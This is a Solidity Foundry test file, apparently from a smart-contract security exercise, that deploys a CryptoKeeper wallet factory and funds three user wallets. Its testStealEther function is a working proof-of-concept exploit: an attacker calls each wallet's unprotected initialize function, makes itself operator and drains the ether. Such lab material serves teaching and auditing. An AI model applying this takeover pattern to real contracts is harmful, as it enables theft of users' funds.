pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {usdcErc20} from "src/call-attacks/call-attacks-2/ERC20.sol";
import "../../../src/call-attacks/call-attacks-3/CryptoKeeper.sol";
import "../../../src/call-attacks/call-attacks-3/CryptoKeeperFactory.sol";
import "../../../src/call-attacks/call-attacks-3/ICryptoKeeper.sol";

contract Call3Test is Test {
    CryptoKeeper cryptoKeeperTemplate;
    CryptoKeeperFactory cryptoKeeperFactory;
    usdcErc20 usdc;
    // start at 100 for some safety reason
    address deployerAddress = address(100);
    address userAddress1 = address(101); //65
    address userAddress2 = address(102); //66
    address userAddress3 = address(103); //67
    address attacker = address(104);
    // set constant price to 5 USDC; keep in mind that USDC has 6 decimals; used 18 here since our mock token has 18 decimals
    uint256 VALUE = 1 * 10 ** 18;
    uint256 USDC_AMOUNT = 10 * 10 ** 18;
    //
    address crpyptoKeeeper1;
    address crpyptoKeeeper2;
    address crpyptoKeeeper3;

    event CryptoKeeperCreated(address _cryptoKeeperAddress);
    event Executed(address caller, address destAddress, bytes encodedCalldata, uint256 value, bytes result);

    function setUp() public {
        // impersonate deployerAddress
        vm.startPrank(deployerAddress);
        // Setup instance of the contract(s)
        usdc = new usdcErc20();
        cryptoKeeperTemplate = new CryptoKeeper();
        cryptoKeeperFactory = new CryptoKeeperFactory(deployerAddress,address(cryptoKeeperTemplate));
        vm.stopPrank();
        // deal ether to EOAs
        deal(deployerAddress, 20 ether);
        deal(userAddress1, 20 ether);
        deal(userAddress2, 20 ether);
        deal(userAddress3, 20 ether);
        deal(attacker, 20 ether);
    }

    function testUser1CreateKeeper() public {
        // user creating a crypto keeper
        vm.startPrank(userAddress1);
        // create user1Salt taking keccak256 of userAddress
        bytes32 user1Salt = keccak256(abi.encodePacked(userAddress1));
        address cryptoKeeper1Address = cryptoKeeperFactory.predictCryptoKeeperAddress(user1Salt);
        vm.expectEmit(false, false, false, true);
        emit CryptoKeeperCreated(cryptoKeeper1Address);
        address[] memory operators = new address[](1);
        operators[0] = userAddress1;
        address cryptKeeper1AddressCreated = cryptoKeeperFactory.createCryptoKeeper(user1Salt, operators);
        payable(cryptoKeeper1Address).call{value: 10 ether}("");
        vm.stopPrank();
        // check if the address of the created crypto keeper is the same as the predicted one
        assertEq(cryptKeeper1AddressCreated, cryptoKeeper1Address);
        crpyptoKeeeper1 = cryptKeeper1AddressCreated;
        // validate that the balance of the crypto keeper is 10 ether from our EOA
        assertEq(cryptoKeeper1Address.balance, 10 ether);
        vm.startPrank(userAddress1);
        ICryptoKeeper(cryptoKeeper1Address).executeWithValue{value: VALUE}(userAddress1, "0x", VALUE);
        vm.stopPrank();
        vm.startPrank(userAddress2);
        vm.expectRevert("Not an operator");
        ICryptoKeeper(cryptoKeeper1Address).addOperator(userAddress2);
        vm.expectRevert("Not an operator");
        ICryptoKeeper(cryptoKeeper1Address).executeWithValue{value: VALUE}(userAddress2, "0x", VALUE);
        vm.stopPrank();
    }

    function testUser2CreateKeeper() public {
        vm.startPrank(userAddress2);
        bytes32 user2Salt = keccak256(abi.encodePacked(userAddress2));
        address cryptoKeeper2Address = cryptoKeeperFactory.predictCryptoKeeperAddress(user2Salt);
        vm.expectEmit(false, false, false, true);
        emit CryptoKeeperCreated(cryptoKeeper2Address);
        address[] memory operators = new address[](1);
        operators[0] = userAddress2;
        address cryptKeeper2AddressCreated = cryptoKeeperFactory.createCryptoKeeper(user2Salt, operators);
        payable(cryptKeeper2AddressCreated).call{value: 10 ether}("");
        vm.stopPrank();
        assertEq(cryptKeeper2AddressCreated, cryptoKeeper2Address);
        crpyptoKeeeper2 = cryptoKeeper2Address;
        assertEq(cryptoKeeper2Address.balance, 10 ether);
    }

    function testUser3CreateKeeper() public {
        vm.startPrank(userAddress3);
        bytes32 user3Salt = keccak256(abi.encodePacked(userAddress3));
        address cryptoKeeper3Address = cryptoKeeperFactory.predictCryptoKeeperAddress(user3Salt);
        vm.expectEmit(false, false, false, true);
        emit CryptoKeeperCreated(cryptoKeeper3Address);
        address[] memory operators = new address[](1);
        operators[0] = userAddress3;
        address cryptKeeper3AddressCreated = cryptoKeeperFactory.createCryptoKeeper(user3Salt, operators);
        payable(cryptoKeeper3Address).call{value: 10 ether}("");
        vm.stopPrank();
        assertEq(cryptKeeper3AddressCreated, cryptoKeeper3Address);
        crpyptoKeeeper3 = cryptoKeeper3Address;
        assertEq(cryptoKeeper3Address.balance, 10 ether);
    }

    function testStealEther() public {
        // create 3 crypto keepers and ensure they have an eth balance for us to steal
        testUser1CreateKeeper();
        emit log_named_uint("cryptoKeeper1Address.balance", payable(crpyptoKeeeper1).balance);
        testUser2CreateKeeper();
        emit log_named_uint("cryptoKeeper2Address.balance", payable(crpyptoKeeeper2).balance);
        testUser3CreateKeeper();
        emit log_named_uint("cryptoKeeper3Address.balance", payable(crpyptoKeeeper3).balance);
        // logic to steal ether since initialize function is not protected
        vm.startPrank(attacker);
        address[] memory operators = new address[](1);
        operators[0] = attacker;
        ICryptoKeeper(crpyptoKeeeper1).initialize(operators);
        ICryptoKeeper(crpyptoKeeeper1).executeWithValue(attacker, "0x", payable(crpyptoKeeeper1).balance);
        ICryptoKeeper(crpyptoKeeeper2).initialize(operators);
        ICryptoKeeper(crpyptoKeeeper2).executeWithValue(attacker, "0x", payable(crpyptoKeeeper2).balance);
        ICryptoKeeper(crpyptoKeeeper3).initialize(operators);
        ICryptoKeeper(crpyptoKeeeper3).executeWithValue(attacker, "0x", payable(crpyptoKeeeper3).balance);
        vm.stopPrank();
        assertEq(crpyptoKeeeper1.balance, 0 ether);
        assertEq(crpyptoKeeeper2.balance, 0 ether);
        assertEq(crpyptoKeeeper3.balance, 0 ether);
    }
}
